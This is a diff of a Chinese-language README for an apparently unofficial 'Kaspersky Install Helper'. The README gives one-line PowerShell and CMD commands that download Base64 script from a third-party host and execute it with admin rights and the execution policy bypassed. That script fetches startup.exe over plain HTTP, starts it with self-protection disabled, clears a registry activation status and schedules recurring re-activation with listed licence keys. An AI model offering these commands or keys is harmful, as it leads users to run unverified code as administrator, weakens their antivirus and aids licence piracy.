@@ -1,201 +1,130 @@
-# 🛡️ Kaspersky Installer
+# Kaspersky Install Helper v2.0.0 - 网络请求地址说明
 
-<p align="center">
-  <img src="https://img.shields.io/badge/version-v1.1.0-blue.svg" alt="version">
-  <img src="https://img.shields.io/badge/platform-Windows%2010%2F11-green.svg" alt="platform">
-  <img src="https://img.shields.io/badge/language-PowerShell-blue.svg" alt="language">
-  <img src="https://img.shields.io/badge/license-MIT-yellow.svg" alt="license">
-</p>
+> v2.0.0 起，下发脚本为「新旧融合版」：同一份脚本同时兼容 **cmd 双击(.bat)** 与 **PowerShell `iex`** 运行，
+> 双语自动识别（中/英），图形界面优先、控制台自动备选，支持版本/激活码选择与每 28 天自动续期。
 
-<p align="center">
-  基于 PowerShell 的 Kaspersky 一键远程安装工具，支持中英文双语 GUI 界面
-</p>
+## 一、脚本入口（一键命令）
 
----
+### 加载器地址
+| 地址 | 说明 |
+|------|------|
+| `https://kbsj.yuholt.cn/` | 脚本主入口，存放 Base64 编码的融合脚本（PowerShell + cmd polyglot） |
 
-## ✨ 功能特性
+### 调用方式
 
-- 🚀 **一键安装** — 一条 PowerShell 命令完成全部流程
-- 🌐 **中英双语** — 自动检测系统语言，切换中/英界面
-- 🖥️ **GUI 窗口** — WPF 可视化安装界面，带实时下载进度条
-- 📦 **自动下载** — 从远程服务器下载安装包，无需手动传输
-- ⚡ **静默安装** — 下载完成后自动启动安装程序
-
----
-
-## 🚀 使用方法
-
-以 **管理员身份** 打开 PowerShell，执行以下命令：
-
+**PowerShell：**
 ```powershell
 $w=New-Object Net.WebClient;$w.Encoding=[Text.Encoding]::UTF8;iex([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($w.DownloadString('https://kbsj.yuholt.cn/'))))
 ```
 
-执行后自动完成：
+**CMD：**
+```cmd
+powershell -NoProfile -ExecutionPolicy Bypass -Command "$w=New-Object Net.WebClient;$w.Encoding=[Text.Encoding]::UTF8;iex([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($w.DownloadString('https://kbsj.yuholt.cn/'))))"
+```
 
-```
-1. ✅ 拉取安装脚本
-2. ✅ 弹出 GUI 安装窗口
-3. ✅ 下载 Kaspersky 安装包（显示进度条）
-4. ✅ 下载完成自动启动安装
-```
+> 也可将脚本另存为 `.bat` 文件双击运行：文件头部的 cmd 启动器会自动申请管理员权限(UAC)，
+> 并调用 PowerShell 执行主体逻辑；通过 `iex` 在线运行时，该 cmd 头部位于 PowerShell 块注释 `<# ... #>` 内会被自动忽略。
+
+### 作用
+从该地址下载 Base64 编码的脚本内容，解码后直接在 PowerShell 中执行，实现一键部署安装流程。
 
 ---
 
-## 🖥️ 界面预览
+## 二、文件下载服务器
 
-### 中文系统
-```
-┌──────────────────────────────────┐
-│      卡巴斯基安装助手 v1.1.0      │
-│                                  │
-│  [██████████████░░░░░░]  68%     │
-│                                  │
-│  状态：正在下载安装包...          │
-│                                  │
-│         [ 取消安装 ]              │
-└──────────────────────────────────┘
+### 基础地址
+| 地址 | 说明 |
+|------|------|
+| `http://gc2.yuholt.cn:5000` | 文件下载服务器根地址（HTTP，端口5000） |
+
+### 下载的文件
+
+| 文件路径 | 文件名 | 作用 |
+|---------|--------|------|
+| `/uploads/startup.exe` | startup.exe | Kaspersky 安装包主程序，下载后自动执行安装 |
+
+### 调用方式（脚本内部）
+```powershell
+$url = "http://gc2.yuholt.cn:5000/uploads/startup.exe"
+$webRequest = [System.Net.HttpWebRequest]::Create($url)
+$response = $webRequest.GetResponse()
+# ... 流式下载到脚本所在目录（带进度），若文件已存在则跳过下载，然后执行
 ```
 
-### English System
-```
-┌──────────────────────────────────┐
-│   Kaspersky Install Helper v1.1.0│
-│                                  │
-│  [██████████████░░░░░░]  68%     │
-│                                  │
-│  Status: Downloading installer...│
-│                                  │
-│         [ Cancel ]               │
-└──────────────────────────────────┘
-```
+### 作用
+将安装包下载到脚本所在目录（缺失才下载），下载完成后以 `/pSelfProtection=0` 启动安装程序。
 
 ---
 
-## 📋 脚本工作流程
+## 三、地址汇总
+
+| # | 地址 | 协议 | 端口 | 用途 |
+|---|------|------|------|------|
+| 1 | `https://kbsj.yuholt.cn/` | HTTPS | 443 | 脚本加载器（存放编码后的融合脚本） |
+| 2 | `http://gc2.yuholt.cn:5000/uploads/startup.exe` | HTTP | 5000 | 安装包下载地址 |
+
+---
+
+## 四、客户端执行流程
 
 ```
-PowerShell (管理员)
+用户执行一键命令 / 双击 .bat
        │
        ▼
-┌─────────────────┐
-│ 1. 检测系统语言  │ ──▶ 中文 / English
-└────────┬────────┘
-         ▼
-┌─────────────────┐
-│ 2. 加载 GUI 窗口 │ ──▶ WPF 窗口 + 进度条
-└────────┬────────┘
-         ▼
-┌─────────────────┐
-│ 3. 下载安装包    │ ──▶ gc2.yuholt.cn:5000/uploads/startup.exe
-│    实时显示进度   │
-└────────┬────────┘
-         ▼
-┌─────────────────┐
-│ 4. 启动安装程序  │ ──▶ Start-Process startup.exe
-└────────┬────────┘
-         ▼
-┌─────────────────┐
-│ 5. 清理临时文件  │ ──▶ 删除下载的安装包
-└─────────────────┘
+┌─────────────────────┐
+│  kbsj.yuholt.cn     │  ← HTTPS 下载 Base64 编码的融合脚本
+│  (脚本加载器)         │
+└─────────┬───────────┘
+          │ 解码 & 执行（自动提权 / UAC）
+          ▼
+┌──────────────────────────────┐
+│  融合脚本运行（本地）          │
+│  · 双语识别(中/英)             │
+│  · 公告/公益声明弹窗           │
+│  · 选择：是否自动续期 + 版本    │  ← WinForms 弹窗，失败自动降级控制台
+│    (标准版/Plus版/优选版)      │
+└─────────┬────────────────────┘
+          │ 按需下载安装包
+          ▼
+┌─────────────────────────────────┐
+│  gc2.yuholt.cn:5000             │  ← HTTP 下载 startup.exe（已存在则跳过）
+│  /uploads/startup.exe           │
+└─────────┬───────────────────────┘
+          │ 启动安装 /pSelfProtection=0
+          ▼
+┌──────────────────────────────┐
+│  监控注册表并清空 ProductStatus │  ← AVP*\environment（激活）
+└─────────┬────────────────────┘
+          │ 若选择了自动续期
+          ▼
+┌──────────────────────────────────────────┐
+│  创建计划任务（每 28 天）                   │
+│  avp.com LICENSE /add <激活码>             │
+│  并修改任务 XML（StartWhenAvailable 等）    │
+│  待 avp.exe 启动后立即续期一次              │
+└────────────────────────────────────────────┘
 ```
 
 ---
 
-## ⚙️ 脚本配置
+## 五、版本与激活码
 
-脚本头部可自定义以下参数：
+| 版本 | 名称 | 激活码 |
+|------|------|--------|
+| 1 | 卡巴斯基 标准版 (Standard) | `GAJPU-UTD18-3B2JJ-62CQ2` |
+| 2 | 卡巴斯基 Plus 版 | `GE86F-9WQRM-KK5PG-1ZE2W` |
+| 3 | 卡巴斯基 优选版 (Premium) | `5AP55-UFAT1-QUMNN-7CUDZ` |
 
-```powershell
-# 安装包下载地址
-$downloadUrl = "http://gc2.yuholt.cn:5000/uploads/startup.exe"
-
-# 安装包保存路径
-$savePath = "$env:TEMP\startup.exe"
-
-# 版本号
-$version = "v1.1.0"
-```
+> 激活码仅在「开启自动续期」时用于计划任务；如果不开启自动续期，则不会写入激活码。
 
 ---
 
-## 🌐 多语言支持
+## 六、注意事项
 
-脚本自动检测 Windows 系统语言：
-
-| 系统语言 | 界面语言 | 检测方式 |
-|---------|---------|---------|
-| 中文（zh-CN / zh-TW） | 🇨🇳 中文 | `Get-Culture` |
-| 其他语言 | 🇺🇸 English | 默认回退 |
-
-**中英文对照：**
-
-| 中文 | English |
-|------|---------|
-| 卡巴斯基安装助手 | Kaspersky Install Helper |
-| 正在下载安装包... | Downloading installer... |
-| 下载完成，正在启动安装... | Download complete, launching installer... |
-| 安装包启动成功！ | Installer launched successfully! |
-| 下载失败 | Download failed |
-| 取消安装 | Cancel |
-
----
-
-## 💻 系统要求
-
-| 项目 | 要求 |
-|------|------|
-| 操作系统 | Windows 10 / 11 |
-| PowerShell | 5.1+ |
-| .NET Framework | 4.5+（WPF GUI 需要） |
-| 权限 | **管理员权限** |
-| 网络 | 需要访问外网 |
-
----
-
-## 📁 项目结构
-
-```
-kaspersky-installer/
-├── install_helper.ps1    # 安装脚本源码
-├── README.md             # 项目说明
-└── LICENSE               # 开源协议
-```
-
----
-
-## 📋 更新日志
-
-### v1.1.0 (2025-06-15)
-- ✨ 新增中英文双语自动切换
-- ✨ 新增 WPF GUI 安装窗口
-- ✨ 新增实时下载进度条
-- 🎨 优化界面样式
-
-### v1.0.0
-- 🎉 初始版本
-- 基础命令行下载安装功能
-
----
-
-## ⚠️ 注意事项
-
-1. 必须以 **管理员身份** 运行 PowerShell
-2. 如果遇到执行策略限制，先执行：
-   ```powershell
-   Set-ExecutionPolicy Bypass -Scope Process -Force
-   ```
-3. 确保网络可以访问 `kbsj.yuholt.cn` 和 `gc2.yuholt.cn`
-4. 安装过程中请勿关闭 PowerShell 窗口
-
----
-
-## 📄 License
-
-[MIT License](LICENSE)
-
----
-
-<p align="center">
-  Made with ❤️ by YuHolt
-</p>
+1. **脚本加载器** (`kbsj.yuholt.cn`) 使用 HTTPS，确保传输安全
+2. **文件服务器** (`gc2.yuholt.cn:5000`) 使用 HTTP，如需更安全可升级为 HTTPS
+3. 如果下载返回 **502**，说明文件服务器后端服务异常，需检查服务器状态
+4. 脚本会自动检测系统语言，支持中文/英文双语界面
+5. 需要 **管理员权限** 运行；cmd/.bat 方式会自动弹 UAC 提权
+6. 运行过程中**请勿关闭**进度窗口和 PowerShell 窗口，否则可能导致激活失败需重新卸载安装
+7. 加载器对客户端做 **UA 过滤**（仅 PowerShell）与 **IP 限流**（每 IP 每小时 10 次），并向脚本注入**零宽字符水印**用于溯源（详见后台 API 文档）
